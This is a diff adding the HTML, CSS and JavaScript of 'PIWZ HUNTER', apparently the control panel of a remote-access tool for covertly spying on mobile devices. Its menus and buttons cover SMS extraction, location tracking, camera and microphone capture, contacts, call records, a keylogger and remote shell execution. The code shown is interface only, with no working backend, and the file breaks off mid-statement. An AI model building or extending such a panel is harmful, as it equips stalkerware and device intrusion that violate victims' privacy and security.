@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PIWZ HUNTER | Dark Cyber Control</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* HACKER THEME STYLING */
+        :root {
+            --matrix-green: #00ff00;
+            --cyber-blue: #0088ff;
+            --dark-bg: #0a0a0a;
+            --darker-bg: #050505;
+            --terminal-bg: #001100;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+        }
+        
+        body {
+            background: var(--dark-bg);
+            color: var(--matrix-green);
+            overflow-x: hidden;
+            min-height: 100vh;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(0, 255, 0, 0.05) 0%, transparent 20%),
+                radial-gradient(circle at 90% 80%, rgba(0, 136, 255, 0.05) 0%, transparent 20%);
+        }
+        
+        /* MATRIX RAIN BACKGROUND */
+        #matrixRain {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.1;
+            pointer-events: none;
+        }
+        
+        /* LOADING SCREEN */
+        #loadingScreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--darker-bg);
+            z-index: 9999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        
+        .loading-text {
+            font-size: 1.5em;
+            margin-bottom: 30px;
+            text-transform: uppercase;
+            letter-spacing: 5px;
+            color: var(--matrix-green);
+            text-shadow: 0 0 10px #00ff00;
+        }
+        
+        .hacker-loader {
+            width: 200px;
+            height: 3px;
+            background: rgba(0, 255, 0, 0.2);
+            border-radius: 3px;
+            overflow: hidden;
+        }
+        
+        .loader-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #00ff00, #0088ff);
+            animation: loading 3s ease-in-out forwards;
+        }
+        
+        @keyframes loading {
+            0% { width: 0%; }
+            50% { width: 60%; }
+            100% { width: 100%; }
+        }
+        
+        /* MAIN HEADER */
+        .header {
+            background: rgba(5, 5, 5, 0.9);
+            padding: 20px;
+            border-bottom: 2px solid var(--matrix-green);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .logo i {
+            color: #ff0000;
+            font-size: 2em;
+            text-shadow: 0 0 15px #ff0000;
+        }
+        
+        .logo h1 {
+            font-size: 1.8em;
+            background: linear-gradient(45deg, #00ff00, #0088ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+        
+        .status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .status-dot {
+            width: 12px;
+            height: 12px;
+            background: #00ff00;
+            border-radius: 50%;
+            box-shadow: 0 0 10px #00ff00;
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        /* MAIN CONTAINER */
+        .container {
+            display: grid;
+            grid-template-columns: 250px 1fr;
+            gap: 20px;
+            padding: 20px;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        
+        /* SIDEBAR MENU */
+        .sidebar {
+            background: rgba(10, 10, 10, 0.8);
+            border: 1px solid #00ff00;
+            border-radius: 10px;
+            padding: 20px;
+            height: fit-content;
+        }
+        
+        .menu-title {
+            color: #0088ff;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #0088ff;
+            font-size: 1.2em;
+        }
+        
+        .menu-item {
+            padding: 12px 15px;
+            margin: 8px 0;
+            background: rgba(0, 255, 0, 0.05);
+            border-left: 3px solid #00ff00;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .menu-item:hover {
+            background: rgba(0, 255, 0, 0.15);
+            transform: translateX(5px);
+        }
+        
+        .menu-item.active {
+            background: rgba(0, 255, 0, 0.2);
+            border-left: 3px solid #ff0000;
+        }
+        
+        /* MAIN CONTENT */
+        .content {
+            background: rgba(5, 5, 5, 0.8);
+            border: 1px solid #0088ff;
+            border-radius: 10px;
+            padding: 25px;
+            min-height: 600px;
+        }
+        
+        .content-title {
+            color: #ff5500;
+            margin-bottom: 20px;
+            font-size: 1.5em;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        
+        /* STATS CARDS */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .stat-card {
+            background: rgba(0, 20, 0, 0.5);
+            border: 1px solid #00ff00;
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+            transition: all 0.3s;
+        }
+        
+        .stat-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(0, 255, 0, 0.2);
+        }
+        
+        .stat-number {
+            font-size: 2.5em;
+            color: #00ff00;
+            text-shadow: 0 0 10px #00ff00;
+        }
+        
+        /* DEVICE TABLE */
+        .device-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        
+        .device-table th {
+            background: rgba(0, 100, 255, 0.2);
+            padding: 15px;
+            text-align: left;
+            border-bottom: 2px solid #0088ff;
+        }
+        
+        .device-table td {
+            padding: 12px 15px;
+            border-bottom: 1px solid rgba(0, 255, 0, 0.1);
+        }
+        
+        .device-table tr:hover {
+            background: rgba(0, 255, 0, 0.05);
+        }
+        
+        .device-status {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+        
+        .online { background: #00ff00; box-shadow: 0 0 10px #00ff00; }
+        .offline { background: #ff0000; box-shadow: 0 0 10px #ff0000; }
+        
+        /* COMMAND PANEL */
+        .command-panel {
+            background: rgba(0, 10, 20, 0.7);
+            border: 1px solid #ff5500;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 30px;
+        }
+        
+        .command-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .command-btn {
+            background: rgba(255, 85, 0, 0.1);
+            border: 1px solid #ff5500;
+            color: #ff5500;
+            padding: 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+        }
+        
+        .command-btn:hover {
+            background: rgba(255, 85, 0, 0.3);
+            transform: scale(1.05);
+        }
+        
+        /* FOOTER */
+        .footer {
+            text-align: center;
+            padding: 20px;
+            margin-top: 30px;
+            border-top: 1px solid rgba(0, 255, 0, 0.2);
+            color: #666;
+            font-size: 0.9em;
+        }
+        
+        /* TERMINAL */
+        .terminal {
+            background: var(--terminal-bg);
+            border: 2px solid #00ff00;
+            border-radius: 5px;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            height: 300px;
+            overflow-y: auto;
+            margin-top: 20px;
+        }
+        
+        .terminal-line {
+            margin-bottom: 5px;
+        }
+        
+        .prompt {
+            color: #00ff00;
+        }
+        
+        /* RESPONSIVE */
+        @media (max-width: 768px) {
+            .container {
+                grid-template-columns: 1fr;
+            }
+            
+            .header {
+                flex-direction: column;
+                gap: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- MATRIX RAIN BACKGROUND -->
+    <canvas id="matrixRain"></canvas>
+    
+    <!-- LOADING SCREEN -->
+    <div id="loadingScreen">
+        <div class="loading-text">PIWZ HUNTER SYSTEM LOADING</div>
+        <div class="hacker-loader">
+            <div class="loader-bar"></div>
+        </div>
+        <div style="margin-top: 20px; color: #666; font-size: 0.9em;">
+            Initializing dark protocols...
+        </div>
+    </div>
+    
+    <!-- MAIN HEADER -->
+    <header class="header">
+        <div class="logo">
+            <i class="fas fa-skull-crossbones"></i>
+            <h1>PIWZ HUNTER</h1>
+        </div>
+        <div class="status">
+            <div class="status-dot"></div>
+            <span>SYSTEM ACTIVE</span>
+            <span style="color: #ff5500; margin-left: 20px;" id="currentTime">--:--:--</span>
+        </div>
+    </header>
+    
+    <!-- MAIN CONTAINER -->
+    <div class="container">
+        <!-- SIDEBAR MENU -->
+        <nav class="sidebar">
+            <div class="menu-title"><i class="fas fa-bars"></i> MAIN MENU</div>
+            
+            <div class="menu-item active" data-page="dashboard">
+                <i class="fas fa-tachometer-alt"></i> Dashboard
+            </div>
+            
+            <div class="menu-item" data-page="devices">
+                <i class="fas fa-mobile-alt"></i> Connected Devices
+            </div>
+            
+            <div class="menu-item" data-page="sms">
+                <i class="fas fa-sms"></i> SMS Manager
+            </div>
+            
+            <div class="menu-item" data-page="location">
+                <i class="fas fa-map-marker-alt"></i> Location Tracker
+            </div>
+            
+            <div class="menu-item" data-page="camera">
+                <i class="fas fa-camera"></i> Camera Access
+            </div>
+            
+            <div class="menu-item" data-page="files">
+                <i class="fas fa-folder"></i> File Explorer
+            </div>
+            
+            <div class="menu-item" data-page="keylogger">
+                <i class="fas fa-keyboard"></i> Keylogger
+            </div>
+            
+            <div class="menu-item" data-page="call">
+                <i class="fas fa-phone"></i> Call Records
+            </div>
+            
+            <div class="menu-item" data-page="apps">
+                <i class="fas fa-app-store"></i> Installed Apps
+            </div>
+            
+            <div class="menu-item" data-page="admin">
+                <i class="fas fa-user-secret"></i> Admin Tools
+            </div>
+            
+            <div class="menu-item" data-page="terminal">
+                <i class="fas fa-terminal"></i> System Terminal
+            </div>
+            
+            <div class="menu-title" style="margin-top: 30px;"><i class="fas fa-cogs"></i> SETTINGS</div>
+            
+            <div class="menu-item" data-page="settings">
+                <i class="fas fa-sliders-h"></i> System Settings
+            </div>
+            
+            <div class="menu-item" data-page="logs">
+                <i class="fas fa-clipboard-list"></i> Access Logs
+            </div>
+        </nav>
+        
+        <!-- MAIN CONTENT -->
+        <main class="content">
+            <h2 class="content-title" id="pageTitle">DASHBOARD OVERVIEW</h2>
+            
+            <!-- DASHBOARD STATS -->
+            <div id="dashboardPage" class="page-content">
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-number" id="onlineDevices">0</div>
+                        <div>Online Devices</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number" id="totalSMS">0</div>
+                        <div>SMS Collected</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number" id="totalCalls">0</div>
+                        <div>Call Records</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number" id="totalFiles">0</div>
+                        <div>Files Accessed</div>
+                    </div>
+                </div>
+                
+                <h3 style="color: #0088ff; margin: 25px 0 15px 0;">
+                    <i class="fas fa-satellite-dish"></i> RECENT ACTIVITY
+                </h3>
+                
+                <table class="device-table">
+                    <thead>
+                        <tr>
+                            <th>Device ID</th>
+                            <th>Status</th>
+                            <th>Last Active</th>
+                            <th>IP Address</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="deviceList">
+                        <!-- Devices will be loaded here -->
+                        <tr>
+                            <td colspan="5" style="text-align: center; padding: 30px;">
+                                <i class="fas fa-sync fa-spin"></i> Loading device data...
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+                
+                <!-- QUICK COMMANDS -->
+                <div class="command-panel">
+                    <h3 style="color: #ff5500;">
+                        <i class="fas fa-rocket"></i> QUICK COMMANDS
+                    </h3>
+                    <div class="command-grid">
+                        <div class="command-btn" onclick="sendCommand('getinfo')">
+                            <i class="fas fa-info-circle"></i><br>Get Device Info
+                        </div>
+                        <div class="command-btn" onclick="sendCommand('getsms')">
+                            <i class="fas fa-sms"></i><br>Extract SMS
+                        </div>
+                        <div class="command-btn" onclick="sendCommand('getlocation')">
+                            <i class="fas fa-map-marker-alt"></i><br>Get Location
+                        </div>
+                        <div class="command-btn" onclick="sendCommand('getcontacts')">
+                            <i class="fas fa-address-book"></i><br>Get Contacts
+                        </div>
+                        <div class="command-btn" onclick="sendCommand('takephoto')">
+                            <i class="fas fa-camera"></i><br>Take Photo
+                        </div>
+                        <div class="command-btn" onclick="sendCommand('recordaudio')">
+                            <i class="fas fa-microphone"></i><br>Record Audio
+                        </div>
+                        <div class="command-btn" onclick="sendCommand('listapps')">
+                            <i class="fas fa-th-list"></i><br>List Apps
+                        </div>
+                        <div class="command-btn" onclick="sendCommand('shellexec')" style="border-color: #ff0000; color: #ff0000;">
+                            <i class="fas fa-terminal"></i><br>Shell Exec
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- OTHER PAGES (INITIALLY HIDDEN) -->
+            <div id="terminalPage" class="page-content" style="display: none;">
+                <div class="terminal" id="terminalOutput">
+                    <div class="terminal-line">
+                        <span class="prompt">root@piwz-hunter:~#</span> system initialized
+                    </div>
+                    <div class="terminal-line">
+                        <span class="prompt">root@piwz-hunter:~#</span> dark protocols active
+                    </div>
+                    <div class="terminal-line">
+                        <span class="prompt">root@piwz-hunter:~#</span> waiting for connections...
+                    </div>
+                </div>
+                <input type="text" id="terminalInput" placeholder="Type command here..." 
+                       style="width: 100%; padding: 10px; margin-top: 10px; background: #000; color: #0f0; border: 1px solid #0f0;">
+            </div>
+            
+            <!-- OTHER PAGE CONTENT WILL BE LOADED DYNAMICALLY -->
+            <div id="otherPages"></div>
+        </main>
+    </div>
+    
+    <!-- FOOTER -->
+    <footer class="footer">
+        PIWZ HUNTER v2.0 | Dark Cyber Control System | 
+        <span id="connectionStatus" style="color: #0f0;">● CONNECTED</span> | 
+        Session: <span id="sessionId">########</span>
+    </footer>
+
+    <script>
+        // MATRIX RAIN EFFECT
+        const canvas = document.getElementById('matrixRain');
+        const ctx = canvas.getContext('2d');
+        
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        
+        const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$+-*/=%"#&_(),.;:?!\\|{}<>[]^~';
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+        
+        for(let i = 0; i < columns; i++) {
+            drops[i] = 1;
+        }
+        
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            ctx.fillStyle = '#0F0';
+            ctx.font = fontSize + 'px monospace';
+            
+            for(let i = 0; i < drops.length; i++) {
+                const text = letters[Math.floor(Math.random() * letters.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                
+                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        
+        setInterval(drawMatrix, 35);
+        
+        // HANDLE LOADING SCREEN
+        window.addEventListener('load', function() {
+            setTimeout(() => {
+                document.getElementById('loadingScreen').style.opacity = '0';
+                setTimeout(() => {
+                    document.getElementById('loadingScreen').style.display = 'none';
+                }, 500);
+            }, 3000);
+        });
+        
+        // UPDATE TIME
+        function updateTime() {
+            const now = new Date();
+            const timeStr = now.toLocaleTimeString();
+            document.getElementById('currentTime').textContent = timeStr;
+        }
+        setInterval(updateTime, 1000);
+        updateTime();
+        
+        // MENU NAVIGATION
+        document.querySelectorAll('.menu
